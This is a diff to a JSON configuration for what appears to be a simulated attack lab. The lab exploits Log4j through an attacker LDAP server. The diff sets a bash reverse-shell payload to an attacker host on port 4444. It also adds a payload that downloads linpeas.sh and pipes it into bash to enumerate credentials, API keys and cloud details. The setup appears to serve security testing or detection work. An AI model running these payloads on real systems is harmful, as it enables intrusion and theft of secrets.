@@ -15,7 +15,8 @@
               "attacker_ldap_port": 1389,
               "attacker_ip": "shell-attacker-${ deployment }.${ dynu_dns_domain }",
               "target_port": 8080,
-              "payload": "/bin/bash -c \"TASK=iam2rds /bin/bash -i >& /dev/tcp/shell-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
+              "target_ip": "log4j-target-${ deployment }.${ dynu_dns_domain }",
+              "payload": "/bin/bash -c \"TASK=kube2exploit /bin/bash -i >& /dev/tcp/shell-attacker-${ deployment }.${ dynu_dns_domain }/4444 0>&1\" | tee /tmp/log.txt",
               "attack_delay": 50400,
               "reverse_shell_port": 4444
             },
@@ -56,8 +57,8 @@
               "enabled": true,
               "listen_ip": "0.0.0.0",
               "listen_port": "4444",
-              "payload": "touch /tmp/multistage_pwned",
-              "attack_delay": 50400
+              "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex",
+              "attack_delay": 30
             }
           }
         }
